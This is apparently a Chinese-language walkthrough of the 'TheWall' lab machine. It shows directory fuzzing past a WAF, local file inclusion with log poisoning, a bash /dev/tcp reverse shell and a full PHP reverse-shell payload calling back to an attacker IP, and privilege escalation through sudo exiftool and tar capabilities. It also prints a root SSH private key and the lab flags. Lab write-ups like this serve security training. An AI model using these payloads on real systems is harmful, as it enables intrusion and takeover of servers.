
|   |   |   |
|---|---|---|
|thewall|easy|Akamai  防火墙、绕过wall、fuzz、文件包含利用、exiftool提权、sudo提权、ssh私钥利用|

# 服务探测
```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A -T 4 -p 22,80 192.168.18.238 
```

22，80
### 目录扫描

由于目标靶场安装了Akamai  防火墙，正常的扫描会被拦截。所以使用gobuster扫描的时候增加延时和线程控制
```css
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.18.238 -x php -e --delay 1s -t 1 


http://192.168.18.238/includes.php
```
这里扫描出来了一个文件包含名字的文件，尝试对其进行fuzz 参数。这里发现任何访问的响应都是200和长度为2，所以还需要设置排除项
```c
wfuzz -c --hc=404 --hh=2 -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://192.168.18.238/includes.php?FUZZ=/etc/passwd'


000217299:   200        28 L     41 W       1460 Ch    "display_pag“
```

得到传入的参数为display_page


# GETSHELL
通过bp 爆破了发现利用访问日志记录。

那我们可以尝试写入webshell到日志，然后取包含它

```css
┌──(kali㉿kali)-[~]
└─$ nc 192.168.18.238 80
GET <?php system($_GET['cmd']); ?>


http://192.168.18.238/includes.php?display_page=/var/log/apache2/access.log&cmd=bash+-c+%27bash+-i+%3E%26/dev/tcp/192.168.44.128/9001+0%3E%261%27
```

获得第一个flag
```c
www-data@TheWall:/home/john$ cat user.txt
cat user.txt
cc5db5e7b0a26e807765f47a006f6221
```

# 使用file_put_contents函数写入shell

```c
nc 192.168.18.238 80 
GET <?php file_put_contents('/var/www/html/a.php',base64_decode($_GET['a'])); ?>
```

访问一下链接：http://192.168.1.226/includes.php?display_page=/var/log/apache2/access.log
然后确定`<?php phpinfo(); ?>`base64编码的代码
```css
http://192.168.18.238/includes.php?display_page=/var/log/apache2/access.log&a=PD9waHAgcGhwaW5mbygpOyA/Pg==
```
接下来去包含这个文件，如下说明写入成功http://192.168.18.238/a.php
这里我们可以换个思路，将phpinfo代码换成php恢复shell代码。

```c
<?php set_time_limit(0);$ip='192.168.44.128';$port=9002;$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';chdir("/");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){exit(1);}$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){exit(1);}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);while(1){if(feof($sock)){break;}if(feof($pipes[1])){break;}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){$input=fread($sock,$chunk_size);fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){$input=fread($pipes[1],$chunk_size);fwrite($sock,$input);}if(in_array($pipes[2],$read_a)){$input=fread($pipes[2],$chunk_size);fwrite($sock,$input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process); ?>

PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7JGlwPScxOTIuMTY4LjQ0LjEyOCc7JHBvcnQ9OTAwMjskY2h1bmtfc2l6ZT0xNDAwOyR3cml0ZV9hPW51bGw7JGVycm9yX2E9bnVsbDskc2hlbGw9J3VuYW1lIC1hOyB3OyBpZDsgL2Jpbi9zaCAtaSc7Y2hkaXIoIi8iKTt1bWFzaygwKTskc29jaz1mc29ja29wZW4oJGlwLCRwb3J0LCRlcnJubywkZXJyc3RyLDMwKTtpZighJHNvY2spe2V4aXQoMSk7fSRkZXNjcmlwdG9yc3BlYz1hcnJheSgwPT5hcnJheSgicGlwZSIsInIiKSwxPT5hcnJheSgicGlwZSIsInciKSwyPT5hcnJheSgicGlwZSIsInciKSk7JHByb2Nlc3M9cHJvY19vcGVuKCRzaGVsbCwkZGVzY3JpcHRvcnNwZWMsJHBpcGVzKTtpZighaXNfcmVzb3VyY2UoJHByb2Nlc3MpKXtleGl0KDEpO31zdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1swXSwwKTtzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sxXSwwKTtzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwwKTtzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLDApO3doaWxlKDEpe2lmKGZlb2YoJHNvY2spKXticmVhazt9aWYoZmVvZigkcGlwZXNbMV0pKXticmVhazt9JHJlYWRfYT1hcnJheSgkc29jaywkcGlwZXNbMV0sJHBpcGVzWzJdKTskbnVtX2NoYW5nZWRfc29ja2V0cz1zdHJlYW1fc2VsZWN0KCRyZWFkX2EsJHdyaXRlX2EsJGVycm9yX2EsbnVsbCk7aWYoaW5fYXJyYXkoJHNvY2ssJHJlYWRfYSkpeyRpbnB1dD1mcmVhZCgkc29jaywkY2h1bmtfc2l6ZSk7ZndyaXRlKCRwaXBlc1swXSwkaW5wdXQpO31pZihpbl9hcnJheSgkcGlwZXNbMV0sJHJlYWRfYSkpeyRpbnB1dD1mcmVhZCgkcGlwZXNbMV0sJGNodW5rX3NpemUpO2Z3cml0ZSgkc29jaywkaW5wdXQpO31pZihpbl9hcnJheSgkcGlwZXNbMl0sJHJlYWRfYSkpeyRpbnB1dD1mcmVhZCgkcGlwZXNbMl0sJGNodW5rX3NpemUpO2Z3cml0ZSgkc29jaywkaW5wdXQpO319ZmNsb3NlKCRzb2NrKTtmY2xvc2UoJHBpcGVzWzBdKTtmY2xvc2UoJHBpcGVzWzFdKTtmY2xvc2UoJHBpcGVzWzJdKTtwcm9jX2Nsb3NlKCRwcm9jZXNzKTsgPz4=



访问http://192.168.18.238/a.php  反弹shell成功
┌──(kali㉿kali)-[~]
└─$ nc -lnvp  9002

```

如果实战中出网，这个时候反弹shell的方法就没法用了。如果知道根目录的情况下我们可以尝试直接写入webshel​​l
或者
```c
┌──(kali㉿kali)-[~]
└─$ nc 192.168.18.238 80
GET <?php file_put_contents('/var/www/html/a.php',base64_decode($_GET['a'])); ?>

http://192.168.1.226/includes.php?display_page=/var/log/apache2/access.log&a=PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==

http://192.168.1.226/a.php?c=whoami
```

# 提权
```C
sudo -l

 (john : john) NOPASSWD: /usr/bin/exiftool

```

https://medium.com/@josemlwdf/thewall-eb99f02e1502

[Linux CentOS 8.x 生成rsa公私密钥\_linux生成公钥私钥-CSDN博客](https://blog.csdn.net/hkl_Forever/article/details/127422236)

[linux ssh公钥免密码登录 - zqifa - 博客园](https://www.cnblogs.com/zqifa/p/ssh-1.html)


```c
┌──(root㉿kali)-[~/.ssh]
└─# ssh-keygen -t rsa
```

我们在/tmp/下创建一个id_rsa.pub，然后使用exiftool将“id rsa.pub”复制到“authorized_key”中
```c
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8hH4Hco6cXEFfQ93KrvQBQ2T+VFaYsxqjENfNdKJvJkoxQD8sn8/5noKVUiWfqv/bn65uivoNh3cZf8AW1afXI/uAAbIHrjPKZM69cScSg2j1F6pgijwwROtuAQIcdyZdiWD8We1j1d1VrOcYV8DmD3+TUKqxrCwuUC1mzBBs2XebKaUj13saSqUZfvWjEaGwnTpXczZqzuDef5ykw2EQzk6RbZ0vhImR7MmgkpAC26PmWeXMcrdmN52l26YcJT3ERLcmCQjZeYwg06RB+0UmwGK5HfFojHuzRKjfaDjWipbKo065lOGZoCF4R4fuXiFjMbcbMJMvUiEhyBnAD2e8FYRdlXd8bv66+1w1Fmg7z8oGZOfJfY++koUGhTHW7yhVECvGvHuBsBDJqdKVl4I7jBY9z0pAuyeogv3KxjdQpnaCXB47HzTKgGFBfxAqzmvUde7SwrIgjXLJrTPzA7rzJvcso/n+4o+fY73jyKUgbh6P/RYSHSxd5RhFVrhu00M= root@kali
" > /tmp/id_rsa.pub

sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/id_rsa.pub
```
由于这是本地kali生成的公钥和私钥对，所以把公钥上传到靶机的/home/john/.ssh/authorized_keys就可以实现免密登录。


[exiftool | GTFOBins](https://gtfobins.github.io/gtfobins/exiftool/#sudo)

换一个思路读取ssh私钥
```c
sudo -u john /usr/bin/exiftool -filename=/tmp/idrsa /home/john/.ssh/id_rsa

┌──(root㉿kali)-[~/.ssh]
└─# ssh -i id_rsa john@192.168.18.238
```


```C
┌──(root㉿kali)-[~]
└─# ssh john@192.168.18.238

john@TheWall:~$ cat user.txt
cc5db5e7b0a26e807765f47a006f6221
```

# 提权-CAP_DAC_READ_SEARCH


我已经使用**scp**将**Linpeas**复制到机器中，如下所示
```c
┌──(root㉿kali)-[~kali/桌面/OSCP]
└─# scp linpeas.sh john@192.168.18.238:~
```
**豌豆**发现了这一点：
```c
Files with capabilities (limited to 50):
/usr/sbin/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

系统根目录下有一个属于**root的****id_rsa文件**
```c
john@TheWall:~$ ls -lah /
```
使用 CAP_DAC_READ_SEARCH，进程可以：

- 读取系统上的任何文件，无论其权限如何。

- 搜索（列出内容）系统上的任何目录，无论其权限如何。


搜索属于用户组的文件
```c
find / -xdev -group 1000 2>/dev/null
```

搜索具有修改功能的文件
```c
/sbin/getcap -r / 2>/dev/null
```

```c
john@TheWall:~$ /usr/sbin/tar -zcf id_rsa.tar /id_rsa

john@TheWall:~$ tar -vxf id_rsa.tar 
john@TheWall:~$ cat id_rsa


-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ nano thewall 
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ chmod 600 thewall 
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ sudo ssh -i thewall root@192.168.18.238


root@TheWall:~# cat r0Ot.txT 
4be82a3be9aed6eea5d0cce68e17662e

```